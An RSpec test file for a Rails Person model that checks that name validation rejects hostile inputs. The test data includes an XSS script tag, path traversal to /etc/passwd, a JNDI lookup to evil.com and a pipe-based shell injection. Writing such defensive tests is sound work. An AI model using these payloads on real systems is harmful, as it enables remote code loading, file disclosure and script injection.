# frozen_string_literal: true

require 'rails_helper'

describe Person, type: :model do
  it 'is valid with valid attributes' do
    expect(build(:person)).to be_valid
  end

  it 'is invalid without an email' do
    person = build(:person, email: nil)
    expect(person).not_to be_valid
  end

  it 'is invalid without a name' do
    person = build(:person, name: nil)
    expect(person).not_to be_valid
  end

  describe 'name validation' do
    it 'is invalid with a name that is too short' do
      person = build(:person, name: 'A')
      expect(person).not_to be_valid
      expect(person.errors[:name]).to include('is too short (minimum is 2 characters)')
    end

    it 'is invalid with a name that is too long' do
      person = build(:person, name: 'A' * 101)
      expect(person).not_to be_valid
      expect(person.errors[:name]).to include('is too long (maximum is 100 characters)')
    end

    it 'is invalid with HTML injection in name' do
      person = build(:person, name: "<script>alert('xss')</script>")
      expect(person).not_to be_valid
      expect(person.errors[:name]).to include('contains invalid characters or patterns')
    end

    it 'is invalid with path traversal in name' do
      person = build(:person, name: '../../etc/passwd')
      expect(person).not_to be_valid
      expect(person.errors[:name]).to include('contains invalid characters or patterns')
    end

    it 'is invalid with JNDI injection in name' do
      person = build(:person, name: '${jndi:ldap://evil.com/a}')
      expect(person).not_to be_valid
      expect(person.errors[:name]).to include('contains invalid characters or patterns')
    end

    it 'is invalid with shell injection in name' do
      person = build(:person, name: 'test|cat /etc/passwd')
      expect(person).not_to be_valid
      expect(person.errors[:name]).to include('contains invalid characters or patterns')
    end

    it 'sanitizes whitespace in name' do
      person = build(:person, name: '  John   Doe  ')
      person.valid?
      expect(person.name).to eq('John Doe')
    end
  end

  describe '.suspicious' do
    it 'finds people with suspicious names' do
      normal_person = create(:person, name: 'Normal Person')
      suspicious_person = create(:person, name: 'Test<script>alert(1)</script>', email: 'test@example.com')

      # Need to skip validation to create the suspicious person
      suspicious_person.save(validate: false)

      suspicious_results = Person.suspicious
      expect(suspicious_results).to include(suspicious_person)
      expect(suspicious_results).not_to include(normal_person)
    end
  end

  describe '.name_looks_suspicious?' do
    it 'returns true for suspicious names' do
      expect(Person.name_looks_suspicious?('<script>')).to be true
      expect(Person.name_looks_suspicious?('../etc/passwd')).to be true
      expect(Person.name_looks_suspicious?('${jndi:ldap://evil.com}')).to be true
      expect(Person.name_looks_suspicious?('|cat /etc/passwd')).to be true
    end

    it 'returns false for normal names' do
      expect(Person.name_looks_suspicious?('John Doe')).to be false
      expect(Person.name_looks_suspicious?('María García')).to be false
      expect(Person.name_looks_suspicious?("John O'Brien")).to be false
    end
  end
end
